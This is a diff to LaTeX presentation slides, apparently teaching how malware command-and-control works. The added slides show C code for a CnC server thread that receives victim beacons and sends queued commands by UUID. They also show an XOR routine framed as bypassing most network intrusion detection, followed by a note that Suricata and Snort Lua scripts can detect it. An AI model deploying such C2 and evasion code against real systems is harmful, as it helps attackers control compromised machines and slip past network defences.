@@ -328,7 +328,7 @@
 
 \begin{frame}[fragile]{}
   \frametitle{CnC Server}
-  \framesubtitle{Command and Control in C Sockets}
+  \framesubtitle{Command and Control in C Sockets 0}
   \begin{center}
     \begin{tcolorbox}[title=net.c,colback=black]
     \begin{minipage}{0.5\textwidth}
@@ -364,7 +364,7 @@
 
 \begin{frame}[fragile]{}
   \frametitle{CnC Server}
-  \framesubtitle{Command and Control in C Sockets}
+  \framesubtitle{Command and Control in C Sockets 1}
   \begin{center}
     \begin{tcolorbox}[title=net.c,colback=black]
     \begin{minipage}{0.5\textwidth}
@@ -396,6 +396,155 @@
       \end{minted}
     \end{minipage}
     \end{tcolorbox}
+  \end{center}
+\end{frame}
+
+\begin{frame}[fragile]{}
+  \frametitle{CnC Server}
+  \framesubtitle{Handling Victim Sessions 0}
+  \begin{center}
+    \begin{tcolorbox}[title=net.c,colback=black]
+    \begin{minipage}{0.5\textwidth}
+      \begin{minted}[fontsize=\tiny]{c}
+        void *net_t_client(void *args){
+          net_t_client_args_t *p_args = args;
+          int sock = p_args->client_fd;
+          net_client_beacon_t **p_victims = p_args->p_victims;
+          net_server_beacon_t **p_commands = p_args->p_commands;
+          net_client_beacon_t *p_net_client_beacon = malloc(sizeof(net_client_beacon_t));
+          net_server_beacon_t *p_net_server_beacon = malloc(sizeof(net_server_beacon_t));
+          while (true){
+            bool command = false;
+            int read = recv(sock, p_net_client_beacon, sizeof(net_client_beacon_t), 0);
+            if (!read){ break; }
+            if (read < 0){
+              fprintf(stderr, "[-] %s\n", strerror(errno));
+              free(p_net_client_beacon);
+              pthread_exit(NULL);
+            }
+            net_update_victims(p_net_client_beacon, p_victims);
+            // contuned ...
+          }
+        }
+      \end{minted}
+    \end{minipage}
+    \end{tcolorbox}
+  \end{center}
+\end{frame}
+
+\begin{frame}[fragile]{}
+  \frametitle{CnC Server}
+  \framesubtitle{Handling Victim Sessions 1}
+  \begin{center}
+    \begin{tcolorbox}[title=net.c,colback=black]
+    \begin{minipage}{0.5\textwidth}
+      \begin{minted}[fontsize=\tiny]{c}
+        for (int i = 0; i < NET_MAX_CLIENTS; i++){
+          if (p_commands[i] != NULL &&
+              (strcmp(p_net_client_beacon->sysinfo.uuid, // Check Victim UUID
+              p_commands[i]->uuid) == 0)){
+            command = true;
+            if (send(sock, p_commands[i], sizeof(net_server_beacon_t), 0) < 0){
+              fprintf(stderr, "[-] %s\n", strerror(errno));
+            }
+            net_remove_commands(p_commands[i], p_commands); // Command Sent to Victim
+          }
+        }
+        if (command == false){
+          p_net_server_beacon->xor_key = DEFS_XOR_KEY; // Set Packet XOR Key
+          p_net_server_beacon->status = true;
+          if (send(sock, p_net_server_beacon, sizeof(net_server_beacon_t), 0) < 0){
+            fprintf(stderr, "[x] %s\n", strerror(errno));
+            free(p_net_server_beacon);
+            free(p_net_client_beacon);
+            pthread_exit(NULL);
+          }
+        }
+      }
+      \end{minted}
+    \end{minipage}
+    \end{tcolorbox}
+  \end{center}
+\end{frame}
+
+\begin{frame}
+  \frametitle{CnC Server}
+  \framesubtitle{How can we thwart most NIDS/NIPS?}
+  \begin{center}
+    \begin{figure}
+      \includegraphics[width=6cm,keepaspectratio]{bypass_firewall}
+      \caption{Bill Gates}
+    \end{figure}
+  \end{center}
+\end{frame}
+
+\begin{frame}
+  \frametitle{CnC Server}
+  \framesubtitle{First Hint}
+  \begin{center}
+    \includegraphics[width=10cm,keepaspectratio]{xor_gate}
+  \end{center}
+\end{frame}
+
+\begin{frame}
+  \frametitle{CnC Server}
+  \framesubtitle{Second Hint}
+  \begin{center}
+    \includegraphics[width=5cm,keepaspectratio]{xor_truth_table}
+  \end{center}
+\end{frame}
+
+\begin{frame}[fragile]{}
+  \frametitle{CnC Server}
+  \framesubtitle{The Function to Bypass Most NIDS/NIPS}
+  \begin{center}
+    \begin{tcolorbox}[title=net.c,colback=black]
+    \begin{minipage}{0.5\textwidth}
+      \begin{minted}[fontsize=\tiny]{c}
+        bool crypt_decrypt_xor(char *data,      // Pointer to Data Structure
+                               int data_size,   // Size of Data
+                               int key){        // The Key
+          for (int i = 0; i < data_size; i++){ 
+            if (i > (int)sizeof(int) - 1){      // Skip over the Key
+              data[i] = data[i]^key;            // XOR the Data
+            }
+          }
+          return true;
+        }
+      \end{minted}
+    \end{minipage}
+    \end{tcolorbox}
+  \end{center}
+\end{frame}
+
+\begin{frame}
+  \frametitle{CnC Server}
+  \framesubtitle{But Why?}
+  \begin{center}
+    \includegraphics[width=7cm,keepaspectratio]{but_why}
+  \end{center}
+\end{frame}
+
+\begin{frame}
+  \frametitle{CnC Server}
+  \framesubtitle{Because can detect this with Lua!}
+  \begin{itemize}
+  \item{Suricata}
+    \begin{itemize}
+    \item{Lua Scripting}
+    \end{itemize}
+  \item{Snort}
+    \begin{itemize}
+    \item{Lua Scripting}
+    \end{itemize}
+  \end{itemize}
+\end{frame}
+
+\begin{frame}
+  \frametitle{CnC Server}
+  \framesubtitle{Performance vs. Detection}
+  \begin{center}
+    \includegraphics[width=14cm,keepaspectratio]{server_room_fire}
   \end{center}
 \end{frame}
 
